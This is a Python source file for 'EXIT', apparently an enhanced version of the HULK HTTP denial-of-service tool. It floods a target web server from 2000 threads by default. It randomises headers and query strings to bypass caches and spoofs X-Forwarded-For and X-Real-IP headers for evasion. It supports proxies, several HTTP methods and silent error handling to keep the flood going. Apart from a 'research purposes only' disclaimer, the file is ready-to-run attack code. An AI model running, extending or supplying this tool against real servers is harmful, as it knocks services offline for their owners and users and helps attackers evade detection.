# ----------------------------------------------------------------------------------------------
# EXIT - HTTP Unbearable Load King
#
# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
# to their knees by exhausting the resource pool, its is meant for research purposes only
# and any malicious usage of this tool is prohibited.
#
# author :  Barry Shteiman , version 2.0 (Enhanced)
# ----------------------------------------------------------------------------------------------
import urllib.request
import urllib.error
import urllib.parse
import sys
import threading
import random
import re
import time
import ssl
import argparse
from http.client import HTTPConnection, HTTPSConnection
from urllib.parse import urlparse

#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0
attack_mode='get'
proxy_url=''
timeout=30
request_delay=0
disable_ssl=False
max_threads=2000  # Increased from 500

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array with modern user agents
def useragent_list():
	global headers_useragents
	# Modern user agents
	headers_useragents.extend([
		'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
		'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
		'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
		'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
		'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
		'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
		'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
		'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
		'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
		'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
	])
	# Legacy user agents for compatibility
	headers_useragents.extend([
		'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
		'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
		'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
		'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
		'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
		'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
		'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
		'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
		'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
		'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
		'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
		'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
	])
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.extend([
		'http://www.google.com/?q=',
		'http://www.usatoday.com/search/results?q=',
		'http://engadget.search.aol.com/search?q=',
		'https://www.google.com/search?q=',
		'https://www.bing.com/search?q=',
		'https://duckduckgo.com/?q=',
		'http://' + host + '/',
		'https://' + host + '/',
	])
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print('---------------------------------------------------')
	print('USAGE: python exit.py <url> [options]')
	print('Options:')
	print('  --safe          Autoshut after dos')
	print('  --mode MODE     Attack mode: get, post, head, put, delete, mixed (default: get)')
	print('  --threads NUM   Number of threads (default: 2000)')
	print('  --timeout SEC   Request timeout in seconds (default: 30)')
	print('  --delay MS      Delay between requests in milliseconds (default: 0)')
	print('  --proxy URL     Proxy URL (e.g., http://127.0.0.1:8080)')
	print('  --insecure      Disable SSL certificate verification')
	print('---------------------------------------------------')

	
#http request
def httpcall(target_url):
	useragent_list()
	referer_list()
	code=0
	
	parsed_url = urlparse(target_url)
	if parsed_url.scheme == '':
		target_url = 'http://' + target_url
		parsed_url = urlparse(target_url)
	
	if target_url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	
	# Determine HTTP method
	method = attack_mode.upper()
	if method == 'MIXED':
		methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']
		method = random.choice(methods)
	
	try:
		if method == 'GET' or method == 'HEAD' or method == 'DELETE':
			full_url = target_url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10))
			request = urllib.request.Request(full_url)
			request.get_method = lambda: method
		elif method == 'POST' or method == 'PUT':
			body_data = buildblock(random.randint(10,50)) + '=' + buildblock(random.randint(10,50))
			request = urllib.request.Request(target_url, data=body_data.encode('utf-8'))
			request.get_method = lambda: method
			request.add_header('Content-Type', 'application/x-www-form-urlencoded')
			request.add_header('Content-Length', str(len(body_data)))
		else:
			request = urllib.request.Request(target_url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
		
		# Set headers
		request.add_header('User-Agent', random.choice(headers_useragents))
		request.add_header('Cache-Control', 'no-cache')
		request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
		request.add_header('Accept', '*/*')
		request.add_header('Accept-Language', 'en-US,en;q=0.9')
		request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
		request.add_header('Keep-Alive', str(random.randint(110,120)))
		request.add_header('Connection', 'keep-alive')
		request.add_header('Host', parsed_url.netloc)
		
		# Add random headers for evasion
		if random.randint(0, 1) == 0:
			request.add_header('X-Forwarded-For', '%d.%d.%d.%d' % (random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)))
		if random.randint(0, 1) == 0:
			request.add_header('X-Real-IP', '%d.%d.%d.%d' % (random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)))
		
		# Setup proxy if provided
		opener = urllib.request.build_opener()
		if proxy_url:
			proxy_handler = urllib.request.ProxyHandler({'http': proxy_url, 'https': proxy_url})
			opener = urllib.request.build_opener(proxy_handler)
		
		# Disable SSL verification if requested
		if disable_ssl:
			ssl_context = ssl.create_default_context()
			ssl_context.check_hostname = False
			ssl_context.verify_mode = ssl.CERT_NONE
			https_handler = urllib.request.HTTPSHandler(context=ssl_context)
			opener = urllib.request.build_opener(https_handler)
		
		# Add delay if specified
		if request_delay > 0:
			time.sleep(request_delay / 1000.0)
		
		response = opener.open(request, timeout=timeout)
		response.read()  # Read and discard response
		response.close()
		code = response.getcode()
		inc_counter()
		
		if code >= 500:
			set_flag(1)
			if safe:
				set_flag(2)
		
	except urllib.error.HTTPError as e:
		code = e.code
		if code >= 500:
			set_flag(1)
			if safe:
				set_flag(2)
		inc_counter()
	except Exception as e:
		# Silently handle errors to keep attack running
		pass
	
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code>=500) and (safe==1):
					set_flag(2)
		except Exception as ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) and (previous!=request_counter):
				print("%d Requests Sent" % (request_counter))
				previous=request_counter
			time.sleep(0.1)
		if flag==2:
			print("\n-- EXIT Attack Finished --")

#execute 
if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='EXIT - HTTP Unbearable Load King')
	parser.add_argument('url', help='Target URL')
	parser.add_argument('--safe', action='store_true', help='Autoshut after dos')
	parser.add_argument('--mode', default='get', choices=['get', 'post', 'head', 'put', 'delete', 'mixed'], help='Attack mode (default: get)')
	parser.add_argument('--threads', type=int, default=2000, help='Number of threads (default: 2000)')
	parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds (default: 30)')
	parser.add_argument('--delay', type=int, default=0, help='Delay between requests in milliseconds (default: 0)')
	parser.add_argument('--proxy', default='', help='Proxy URL (e.g., http://127.0.0.1:8080)')
	parser.add_argument('--insecure', action='store_true', help='Disable SSL certificate verification')
	
	args = parser.parse_args()
	
	# Set global variables
	url = args.url
	attack_mode = args.mode
	safe = 1 if args.safe else 0
	timeout = args.timeout
	request_delay = args.delay
	proxy_url = args.proxy
	disable_ssl = args.insecure
	max_threads = args.threads
	
	if url.count("/")==2:
		url = url + "/"
	
	m = re.search('(https?\://)?([^/]*)/?.*', url)
	if m:
		host = m.group(2)
	else:
		parsed = urlparse(url)
		host = parsed.netloc or parsed.path.split('/')[0]
	
	print("-- EXIT Attack Started (v2.0) --")
	print("Mode: %s | Threads: %d | Timeout: %ds" % (attack_mode.upper(), max_threads, timeout))
	print("")
	
	for i in range(max_threads):
		t = HTTPThread()
		t.daemon = True
		t.start()
	
	monitor = MonitorThread()
	monitor.daemon = True
	monitor.start()
	
	try:
		while flag < 2:
			time.sleep(0.1)
	except KeyboardInterrupt:
		print("\n-- Interrupted by user --")
		set_flag(2)
